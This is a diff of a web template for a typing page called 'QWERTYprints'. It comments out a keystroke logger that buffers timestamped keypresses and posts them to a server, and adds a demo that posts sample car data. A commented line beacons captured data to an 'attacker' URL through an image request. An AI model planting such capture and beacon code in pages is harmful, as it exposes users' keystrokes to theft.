@@ -2,30 +2,54 @@
 <script type="text/javascript">
 var buffer = [];
 
-document.onkeypress = function(e) {
-    var timestamp = Date.now() | 0;
-    var stroke = {
-        k: e.key,
-        t: timestamp
-    };
-    buffer.push(stroke);
+// document.onkeypress = function(e) {
+//     var timestamp = Date.now() | 0;
+//     var stroke = {
+//         k: e.key,
+//         t: timestamp
+//     };
+//     buffer.push(stroke);
+// }
+
+// window.setInterval(function() {
+//     if (buffer.length > 0) {
+//         $.post("receiver", buffer, function(){
+            
+//         });
+//         // var data = encodeURIComponent(JSON.stringify(buffer));
+//         // new Image().src = attacker + data;
+//         buffer = [];
+//         // event.preventDefault();
+//     }
+// }, 2000);
+var cars = [
+	{ "make":"Porsche", "model":"911S" },
+	{ "make":"Mercedes-Benz", "model":"220SE" },
+	{ "make":"Jaguar","model": "Mark VII" }
+];
+
+window.onload = function() {
+	// setup the button click
+	document.getElementById("theButton").onclick = function() {
+		doWork()
+	};
 }
 
-window.setInterval(function() {
-    if (buffer.length > 0) {
-        $.post("receiver", buffer, function(){
-            
-        });
-        buffer = [];
-        // event.preventDefault();
-    }
-}, 2000);
+function doWork() {
+	// ajax the JSON to the server
+	$.post("receiver", cars, function(){
+
+	});
+	// stop link reloading the page
+ event.preventDefault();
+}
 
 </script>
 <html>
     <head>
         <title>{{ title }} - QWERTYprints</title>
     </head>
+    <a href="" id="theButton">Click Me</a>
     <body>
         <h1>Hello, user No. {{ user}}!</h1>
         <h2>Please type the paragraph in the box below:</h2>
